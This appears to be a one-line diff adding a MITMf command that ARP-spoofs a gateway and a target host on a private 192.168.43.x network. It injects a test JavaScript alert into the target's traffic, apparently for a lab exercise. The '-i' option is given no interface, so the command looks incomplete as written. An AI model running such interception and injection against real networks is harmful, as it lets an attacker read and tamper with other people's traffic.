@@ -1,0 +1,1 @@
+mitmf --arp --spoof -i --gateway 192.168.43.1 --targets 192.168.43.131 --inject --jspayload "alert('test');"
